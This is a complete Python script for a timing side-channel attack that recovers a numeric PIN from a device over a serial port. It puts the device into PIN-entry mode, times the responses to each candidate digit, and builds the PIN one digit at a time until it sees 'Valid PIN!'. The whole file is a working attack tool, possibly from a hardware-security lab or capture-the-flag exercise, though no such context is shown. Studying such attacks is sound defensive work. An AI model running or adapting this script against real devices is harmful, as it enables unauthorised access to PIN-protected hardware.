import serial
import serial.tools.list_ports
import time
from typing import Tuple

# === CONFIGURATION ===
BAUDRATE = 115200
CHARSET = '0123456789'
MAX_PASSWORD_LENGTH = 15
TRIALS_PER_CHAR = 3
SUCCESS_STRING = b"Valid PIN!"

# === SELECT COM PORT ===
def list_serial_ports():
    ports = list(serial.tools.list_ports.comports())
    for i, port in enumerate(ports):
        print(f"{i}: {port.device} - {port.description}")
    return ports

def select_port(ports):
    while True:
        try:
            index = int(input("Select COM port by number: "))
            if 0 <= index < len(ports):
                return ports[index].device
        except ValueError:
            pass
        print("Invalid selection. Try again.")

# === TIME A SINGLE PASSWORD ATTEMPT ===
def measure_timing(candidate: str, ser: serial.Serial) -> Tuple[float, bool]:
    times = []
    for _ in range(TRIALS_PER_CHAR):
        if not prepare_for_pin_entry(ser):
            print("[!] Skipping this trial due to device readiness issue.")
            continue  # Skip this trial if the device is not ready

        ser.reset_input_buffer()
        to_send = candidate.encode() + b'\n'

        send_time = time.perf_counter_ns()
        ser.write(to_send)
        ser.flush()

        response = b''
        recv_time = None
        start_time = time.time()

        while time.time() - start_time < 1:  # max 1 second wait
            byte = ser.read(1)
            if not byte:
                continue

            # First byte received: capture timestamp
            if recv_time is None:
                recv_time = time.perf_counter_ns()
                if byte != b'V':  # You can adjust this if needed
                    break

            response += byte

            if SUCCESS_STRING in response:
                elapsed = recv_time - send_time
                return elapsed, True  # Early exit on success

        if recv_time is None:
            recv_time = time.perf_counter_ns()

        elapsed = recv_time - send_time
        times.append(elapsed)
        time.sleep(0.12)

    if times:
        avg_time = sum(times) / len(times)
    else:
        avg_time = float('inf')

    return avg_time, False

# === ENTER PASSWORD MODE ===
def prepare_for_pin_entry(ser: serial.Serial, timeout: float = 1.0) -> bool:
    ser.reset_input_buffer()
    ser.write(b"3")
    ser.flush()

    response = b""
    start_time = time.time()

    while time.time() - start_time < timeout:
        byte = ser.read(1)
        if byte:
            response += byte
            if b"Enter PIN: " in response:
                return True

    print("[!] Timeout waiting for 'Enter PIN:' prompt.")
    return False

# === GUESS THE PASSWORD ===
def guess_password(ser: serial.Serial):
    guess = ""
    for position in range(MAX_PASSWORD_LENGTH):
        print(f"\n[+] Guessing character {position + 1}")
        timings = {}

        for c in CHARSET:
            trial_input = guess + c
            avg_time, success = measure_timing(trial_input, ser)
            timings[c] = avg_time
            print(f"    Tried '{trial_input:<{MAX_PASSWORD_LENGTH}}' -> {avg_time / 1000:.2f} µs")
            if success:
                print(f"[✓] Valid password found: {trial_input}")
                return trial_input

        best_char = max(timings, key=timings.get)
        guess += best_char
        print(f"[+] Best match so far: {guess}")

    print("[!] Max password length reached.")
    return guess

# === MAIN ===
if __name__ == "__main__":
    try:
        ports = list_serial_ports()
        if not ports:
            print("No COM ports found.")
            exit()

        port_name = select_port(ports)

        with serial.Serial(port_name, BAUDRATE, timeout=1) as ser:
            print(f"Connected to {port_name} at {BAUDRATE} baud.")
            final_guess = guess_password(ser)
            print(f"\n[✓] Final password guess: {final_guess}")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Error: {e}")